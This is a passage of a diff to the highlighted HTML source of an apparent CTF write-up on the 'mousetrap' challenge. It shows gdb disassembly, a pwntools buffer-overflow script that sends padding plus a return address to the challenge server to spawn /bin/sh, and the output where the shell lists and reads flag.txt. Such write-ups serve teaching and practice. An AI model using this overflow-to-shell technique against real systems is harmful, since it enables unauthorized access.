+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400717&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400718&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040071b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x226&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400948&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400722&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x4005f0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400727&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;nop&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400728&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400729&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;    
+&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400948&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x400948&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;So In order to execute the shell I had to call the address before the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; so that after overflow that address will be executed and we got the shell i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;0x000000000040071b&lt;/code&gt;.&lt;/p&gt;
@@ -349,54 +357,54 @@ gef➤
 
 &lt;p&gt;In order to execute this on server of &lt;code class=&quot;highlighter-rouge&quot;&gt;hackpack&lt;/code&gt;and get a flag I made script in python.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from pwn import * 
-from sys import * 
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; 
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; 
 
-context= ['tmux', 'new-window']
-p=remote('cha.hackpack.club',41719)
-elf=ELF(&quot;./mousetrap&quot;)
-p=gdb.debug(&quot;./mousetrap&quot;)
-p.recvuntil(&quot;Name: &quot;)
+&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tmux'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'new-window'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cha.hackpack.club'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41719&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./mousetrap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./mousetrap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Name: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-# to overflow the Code sequence 
-payload= &quot;A&quot;*24 
-payload+= p64(0x40) #value to overflow the name variable
-p.send(payload)
+&lt;span class=&quot;c1&quot;&gt;# to overflow the Code sequence 
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#value to overflow the name variable
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-p.recvuntil(&quot;Enter Code Sequence of 64: &quot;)
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Code Sequence of 64: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-payload2= &quot;A&quot;*24
-payload2+= p64(0x000000000040071b)#  address before /bin/sh
-p.send(payload2)
+&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x000000000040071b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#  address before /bin/sh
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-p.interactive()
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;By running this I got the flag .&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gr4n173@root:~# python exploit.py
-+] Starting local process './mousetrap': pid 14085
-[*] '/home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-[*] '/home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/libc.so.6'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-[+] Starting local process '/usr/bin/gdbserver': pid 14089
-[*] running in new terminal: /usr/bin/gdb -q  &quot;./mousetrap&quot; -x &quot;/tmp/pwnQRen2_.gdb&quot;
-[*] Switching to interactive mode
-Detaching from process 14105
-$ ls
-flag.txt
-mousetrap
-$ cat flag.txt
-flag{C0nTr0l_S1Z3_4_$h3LL}
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;gr4n173&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:~&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# python exploit.py&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'./mousetrap'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14085&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap'&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;Arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;nx&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;little&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;RELRO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;Partial&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;RELRO&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;Stack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;No&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;found&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;NX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;nx&quot;&gt;NX&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;enabled&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;PIE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;      &lt;span class=&quot;nx&quot;&gt;No&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PIE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/libc.so.6'&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;Arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;nx&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;little&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;RELRO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;Partial&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;RELRO&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;Stack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;Canary&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;found&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;NX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;nx&quot;&gt;NX&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;enabled&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;PIE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;      &lt;span class=&quot;nx&quot;&gt;PIE&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;enabled&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/usr/bin/gdbserver'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14089&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;running&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;terminal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;usr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;gdb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;q&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;./mousetrap&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/pwnQRen2_.gdb&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Switching&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;interactive&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mode&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Detaching&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14105&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;txt&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;mousetrap&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;txt&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C0nTr0l_S1Z3_4_&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$h3LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;conclusion-&quot;&gt;Conclusion:-&lt;/h2&gt;
